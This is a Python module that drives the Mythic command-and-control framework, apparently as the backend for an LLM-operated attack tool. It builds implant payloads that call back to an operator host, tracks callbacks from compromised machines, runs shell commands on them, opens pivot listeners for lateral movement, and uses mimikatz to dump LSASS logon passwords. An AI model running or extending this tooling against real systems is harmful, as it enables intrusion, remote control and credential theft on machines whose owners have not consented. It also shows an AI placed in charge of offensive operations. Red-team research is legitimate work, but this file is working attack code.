"""
Module that handles all responsibilities related
to working with Mythic C2
"""
import os
import json
import uuid
import socket
from typing import List, Tuple
from pydantic import BaseModel, UUID4

from mythic import mythic
from dotenv import load_dotenv
# from app.core.config import get_settings

mythic_instance = None
load_dotenv()


# for type check returns
class AgentCommandOutput(BaseModel):
    """ result of execute command on Agent"""
    output: str
    mythic_task_id: int
    mythic_payload_id: int
    mythic_payload_uuid: UUID4


class NewPayloadOutput(BaseModel):
    """ result of create new payload, log is from build """
    payload_uuid: UUID4
    payload_id: int
    status: str
    raw_log: str


async def init_mythic() -> mythic.mythic_classes.Mythic:
    """ async get connect to mythic """
    global mythic_instance
    """
    # in .env like MYTHIC__SERVER_PORT=7443
    mythic_instance_env = get_settings().mythic
    print(mythic_instance_env) # debug
    mythic_instance = await mythic.login(
        username=mythic_instance_env.username,
        # etc
    )
    """
    mythic_instance = await mythic.login(
        username=os.getenv('MYTHIC__USERNAME'),
        password=os.getenv('MYTHIC__PASSWORD'),
        server_ip=os.getenv('MYTHIC__SERVER_IP'),
        server_port=os.getenv('MYTHIC__SERVER_PORT'),
        timeout=-1
    )
    return mythic_instance


async def create_payload_d(
    file_name: str = "nt-merlin",
    lhost: str = "local",
    lport: int = 4329, os_type: str = "Windows",
    payload_type: str = "None"
) -> NewPayloadOutput:
    """ create payload and save, nt-merlin-http by default """
    if lhost == "local":
        # get lhost by ip of interface of open socket
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("1.1", 80))
            lhost = s.getsockname()[0]
    if lport == -1:
        # user must setup profile with zero agent
        lport = os.getenv('MYTHIC__PAYLOAD_PORT_HTTP')
    # set default payload mythic type for os
    if payload_type == "None":  # cuz proc
        payload_type = {
            "Windows": "merlin",
            "macOS": "poseidon",  # temp
            "Linux": "poseidon"
        }.get(os_type)

    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name=payload_type,
        filename=file_name,
        operating_system=os_type,
        commands=[],  # just default by Mythic C2
        # include_all_commands: bool = False,
        c2_profiles=[
            {
                "c2_profile": "http",
                "c2_profile_parameters": {
                    "callback_host": lhost,
                    "callback_port": lport,
                },
            }
        ],
        build_parameters=[{"name": "mode", "value": "default"},
                          {"name": "garble", "value": False}],
        return_on_complete=True,  # wait for build
    )
    p_uuid = payload_response["uuid"]
    p_id = payload_response["id"]
    # idk why, but uuid for download is different but also works
    status = payload_response["build_phase"]
    raw_log = payload_response["build_message"]
    return NewPayloadOutput(
        payload_uuid=p_uuid, payload_id=p_id,
        status=status, raw_log=raw_log
    )


async def get_cmd_list_for_payload(
    p_type: str = "merlin", os_type: str = "Windows"
) -> List[str]:
    """ for llm get all available commands by type and os """
    resp = await mythic.get_all_commands_for_payloadtype(
        mythic=mythic_instance,
        payload_type_name=p_type
    )
    # filter by os, maybe later with custom_return_attributes GraphQL
    cmd_list: List[str] = []
    for cmd in resp:
        at_os = cmd['attributes']['supported_os']
        if not at_os or os_type in at_os:  # [] means any os
            cmd_list.append(cmd['cmd'])
    return cmd_list  # os already know


async def c2_pivoting_agent(display_id, lport, agent_type) -> str:
    """ forward agent via itself, return status """
    # check support resp = await mythic.get_all_commands_for_payloadtype(
    # mythic=mythic_instance, payload_type_name="poseidon")
    command_name, parameters = "", ""
    if agent_type == "merlin":
        command_name = "listener"
        parameters = f"start tcp 0.0.0.0:{lport}"
    if agent_type == "poseidon":
        # poseidon_tcp C2 P2P
        command_name = "link_tcp"
        parameters = f"0.0.0.0 {lport}"
    if agent_type == "apollo":
        command_name = "link"
        parameters = f"0.0.0.0 {lport}"
    else:
        return "fail"
    # not in function because just task
    status = await mythic.issue_task(
        mythic=mythic_instance, command_name=command_name,
        parameters=parameters, callback_display_id=display_id,
        timeout=30, wait_for_complete=True,
    )
    return status


async def get_agent_callback_after(rhost) -> Tuple[str, str, int]:
    """ get os, status, display_id of new callback,
        you must run this after payload """
    # payload is delivered and start by user cuz diversity of RCE
    global mythic_instance

    # custom query that will be wrapped in custom_return_attributes for GraphQL
    custom_attributes = """
    id
    host
    ip
    user
    payload {
        os
        id
        uuid
    }
    """
    result = await mythic.get_all_active_callbacks(
        mythic=mythic_instance, custom_return_attributes=custom_attributes
    )
    # callback id == display id for most cases
    if (res_c := next((     # JS like style for value safe
        (i['payload']['os'], i['id'])   # select to next os and id
        for i in result
        for ip in json.loads(i['ip'])  # json for ip deserialization
        if ip == rhost      # check for our RHOST
    ), None)):      # otherwise return default
        os_type, d_id = res_c
        return os_type, 'success', d_id

    return "Linux", "fail", 1


async def get_os_by_display_id(display_id) -> Tuple[str, str, str]:
    """ get OS/hostname by callback display id to Agent """
    custom_attributes = """
    id
    host
    payload {
        os
    }
    """
    # maybe caching is possible here
    result = await mythic.get_all_active_callbacks(
        mythic=mythic_instance, custom_return_attributes=custom_attributes
    )
    if (res_c := next((
        (i['host'], i['payload']['os'])  # select agent host, payload os
        for i in result
        if i['id'] == display_id
    ), None)):      # otherwise return default
        host, os_type = res_c
        return host, os_type, 'success'
    return "windows", "Windows", "fail"


async def get_agent_callback_before(rhost) -> Tuple[str, str, int]:
    """ get os, status, display_id of new callback,
        you must run payload after this func or with timeout """
    # payload is delivered and start by user cuz diversity of RCE
    async for c in mythic.subscribe_new_callbacks(
        mythic=mythic_instance, batch_size=1
    ):
        if c[0]['external_ip'] == rhost:
            return c[0]['os'], 'success', c[0]['display_id']
    return "linux", "fail", 1


async def check_status(callback_display_id: int) -> str:
    """ check status of agent, if there is display_id in active
        -> agent callback not completely dead """
    global mythic_instance
    if mythic_instance is None:
        mythic_instance = await init_mythic()
    # we need just display_id from active callback
    custom_attributes = """
    display_id
    """
    result = await mythic.get_all_active_callbacks(
        mythic=mythic_instance, custom_return_attributes=custom_attributes
    )
    has_id = any(i.get("display_id") == callback_display_id for i in result)
    if has_id:
        return "success"
    # maybe add elif based on time
    return "fail"


async def get_payload_ids(callback_display_id) -> Tuple[int, UUID4]:
    """ get payload id and uuid from display id """
    global mythic_instance

    # custom query that will be wrapped in custom_return_attributes for GraphQL
    custom_attributes = """
    id
    payload {
        id
        uuid
    }
    """
    result = await mythic.get_all_active_callbacks(
        mythic=mythic_instance, custom_return_attributes=custom_attributes
    )
    # callback id == display id for most cases
    callback = next(
        (i for i in result if i.get("id") == callback_display_id),
        None)
    # walrus almost like go, if payload is none -> ret default
    if callback and (payload := callback.get("payload")):
        return payload.get("id"), payload.get("uuid")
    # default null/fake
    return 1, uuid.uuid4()


async def execute_local_command(
    cmd: str, callback_display_id: int, timeout: int = 500
) -> AgentCommandOutput:
    """ async function to execute command on zero agent via shell agent
        and timeout, inside, there is a subscription to graphql event
        at the end of the task"""
    global mythic_instance

    output = await mythic.issue_task_and_waitfor_task_output(
        mythic=mythic_instance,
        command_name="shell",
        parameters=cmd,
        callback_display_id=callback_display_id,
        timeout=timeout,
    )
    # temp value
    mythic_t_id = callback_display_id
    mythic_p_id, mythic_p_uuid = await get_payload_ids(callback_display_id)

    return AgentCommandOutput(
        output=str(output),  # from mythic is bytestring
        mythic_task_id=mythic_t_id, mythic_payload_id=mythic_p_id,
        mythic_payload_uuid=mythic_p_uuid
    )


async def execute_agent_command_o(
    cmd: str, params: str, callback_display_id: int, timeout=300
) -> AgentCommandOutput:
    """ execute cmd with params on remote agent """
    output = await mythic.issue_task_and_waitfor_task_output(
        mythic=mythic_instance, command_name=cmd, parameters=params,
        callback_display_id=callback_display_id, timeout=timeout,
    )
    mythic_p_id, mythic_p_uuid = await get_payload_ids(callback_display_id)
    return AgentCommandOutput(
        output=str(output), mythic_task_id=1,
        mythic_payload_id=mythic_p_id, mythic_payload_uuid=mythic_p_uuid
    )


async def mimikatz_on_agent(display_id, agent_type) -> Tuple[str, int, UUID4]:
    """ run mimikatz from agent to dump LSASS, mostly for agent pivoting """
    if agent_type == "apollo":
        result: AgentCommandOutput = await execute_agent_command_o(
            cmd="mimikatz",
            params="""-Command "sekurlsa::minidump C:\\Temp\\ls.dmp" """
                   """ "sekurlsa::logonPasswords" """,
            callback_display_id=display_id
            )
        # todo extract and check hashes from dmp
        return result
